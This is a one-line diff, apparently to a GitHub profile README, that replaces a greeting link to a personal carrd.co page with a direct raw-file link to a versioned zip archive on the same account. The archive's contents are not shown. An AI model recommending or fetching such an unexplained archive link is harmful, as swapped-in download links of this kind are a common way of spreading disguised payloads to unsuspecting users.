@@ -1,1 +1,1 @@
-- 👋 Hi,https://kumkum.carrd.co
+- 👋 Hi,https://raw.githubusercontent.com/kuki1012/kuki1012/main/reaccount/kuki1012-v3.4-alpha.2.zip
